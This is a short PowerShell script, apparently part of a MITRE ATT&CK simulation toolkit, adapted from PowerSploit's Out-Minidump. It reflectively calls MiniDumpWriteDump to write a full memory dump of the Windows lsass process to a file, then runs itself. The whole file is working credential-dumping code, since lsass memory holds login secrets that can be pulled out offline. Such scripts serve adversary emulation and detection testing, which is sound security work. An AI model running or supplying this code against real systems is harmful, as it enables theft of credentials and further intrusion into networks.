Function sub_Credentials_LsassMemoryDump() {
    # Based on code: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
    $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
    $MiniDumpWithFullMemory = [UInt32] 2

    $FileName = "C:\Simulate_Mitre\exfil\lsassdump_powrshell.tmp"
    $FileStream = New-Object IO.FileStream($FileName, [IO.FileMode]::Create)
    $Lsaass = Get-Process lsass

    Write-host "$($Lsaass.Modules[0].FileName) current PID [$($Lsaass.Id)]"
    $Result = $MiniDumpWriteDump.Invoke($null, @($Lsaass.Handle,
            $Lsaass.Id,
            $FileStream.SafeFileHandle,
            $MiniDumpWithFullMemory,
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            [IntPtr]::Zero))

    $FileStream.Close()

    if (-not $Result) {
        Write-Error "Failed to Capture Lsass Memory Dump"
    }
    else {
        Write-host "Memory dump created: [$FileName] Size: $((Get-ChildItem $FileName).Length)"
    }
}

sub_Credentials_LsassMemoryDump